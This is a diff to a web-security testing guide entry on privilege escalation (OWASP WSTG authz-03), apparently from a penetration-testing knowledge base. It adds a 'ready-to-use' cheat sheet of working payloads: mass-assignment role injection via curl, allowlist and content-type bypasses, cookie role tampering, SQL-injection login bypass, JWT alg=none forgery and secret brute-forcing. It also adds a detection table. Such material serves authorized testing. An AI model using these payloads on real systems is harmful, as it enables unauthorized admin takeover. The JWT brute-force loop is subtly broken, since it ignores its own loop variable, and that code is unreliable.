@@ -9,8 +9,10 @@ tags: [authorization, access-control, privilege, wstg, authz]
 tech_stack: []
 cwe_ids: [CWE-269]
 chains_with: [wstg-authz-02, wstg-athn-05]
-prerequisites: [wstg-athn-01, wstg-idnt-01]
-severity_boost: {}
+prerequisites: [wstg-athn-01, wstg-idnt-01, wstg-idnt-02]
+severity_boost:
+  wstg-authz-02: "Privilege Escalation + Authorization Bypass = escalated privileges combine with inconsistent access enforcement for unrestricted admin functionality (Full Admin Takeover, Critical)"
+  wstg-athn-05: "Privilege Escalation + Vulnerable Remember-Me Token = once elevated to admin, a predictable remember-me token lets the attacker keep that admin-level access even after passwords/sessions are reset (Persistent Admin-Level Account Takeover, Critical)"
 ---
 
 # wstg-authz-03
@@ -526,6 +528,74 @@ print(f"Function-level access: {len(func_vulns)} findings")
 
 ---
 
+## Example Commands/Payloads
+
+### Ready-to-Use Escalation Cheat Sheet
+
+```bash
+BASE="https://{target}"
+TOKEN="user_token"
+
+# Mass-assignment role injection during profile update
+curl -s -X PUT "$BASE/api/user/profile" -H "Authorization: Bearer $TOKEN" \
+    -H "Content-Type: application/json" \
+    -d '{"role":"admin","isAdmin":true,"is_admin":1,"permissions":["admin","write","delete"],"group_id":1}'
+
+# Role injection at registration time
+curl -s -X POST "$BASE/api/register" -H "Content-Type: application/json" \
+    -d '{"username":"attacker","password":"Passw0rd!","email":"a@test.com","role":"admin"}'
+
+# JWT alg=none bypass
+python3 - <<'EOF'
+import base64, json
+token = "PASTE_JWT_HERE"
+h, p, s = token.split(".")
+header = json.loads(base64.urlsafe_b64decode(h + "=="))
+payload = json.loads(base64.urlsafe_b64decode(p + "=="))
+header["alg"] = "none"
+payload["role"] = "admin"
+enc = lambda o: base64.urlsafe_b64encode(json.dumps(o).encode()).decode().rstrip("=")
+print(f"{enc(header)}.{enc(payload)}.")
+EOF
+
+# JWT weak-secret brute force (HS256)
+for s in secret password 123456 key admin changeme; do
+  jwt_tool "$TOKEN" -C -d /usr/share/wordlists/rockyou.txt 2>/dev/null
+done
+# or single-shot with a candidate secret using jwt_tool:
+python3 jwt_tool.py "$TOKEN" -S hs256 -p "secret"
+
+# Cookie-based role tampering
+curl -s "$BASE/admin/dashboard" -b "role=admin; is_admin=1; session=$SESSION"
+
+# SQLi-based role bypass at login
+curl -s -X POST "$BASE/login" -d "username=admin'--&password=x"
+curl -s -X POST "$BASE/login" -d "username=' OR role='admin'--&password=x"
+
+# Nested/wrapped mass-assignment role injection (bypasses top-level-only allowlists)
+curl -s -X PUT "$BASE/api/user/profile" -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
+    -d '{"user":{"role":"admin"},"role":["admin"]}'
+
+# Same role injection via form-encoded body (Content-Type swap bypasses a JSON-only filter)
+curl -s -X PUT "$BASE/api/user/profile" -H "Authorization: Bearer $TOKEN" \
+    -d "role=admin&isAdmin=true"
+
+# PATCH instead of PUT (partial-update handlers sometimes skip allowlist checks)
+curl -s -X PATCH "$BASE/api/user/profile" -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
+    -d '{"role":"admin"}'
+```
+
+### Detection Patterns
+
+| Signal                                            | Meaning                          |
+| --------------------------------------------------- | --------------------------------- |
+| Profile `role` field changes after injection         | Mass-assignment priv-esc          |
+| `alg: none` token accepted (`200` on protected route) | JWT signature not verified        |
+| Forged token with weak secret accepted                | Weak HMAC secret                  |
+| Cookie-only role trusted without server-side check    | Client-controlled authorization   |
+
+---
+
 ## Remediation Guide
 
 ### 1. Server-Side Role Enforcement
@@ -682,6 +752,7 @@ class SecureJWT:
 - [OWASP WSTG - Privilege Escalation](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/03-Testing_for_Privilege_Escalation)
 - [OWASP Authorization Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Authorization_Cheat_Sheet.html)
 - [JWT Security Best Practices](https://datatracker.ietf.org/doc/html/rfc8725)
+- [PayloadsAllTheThings - Mass Assignment](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Mass%20Assignment)
 
 
 ---
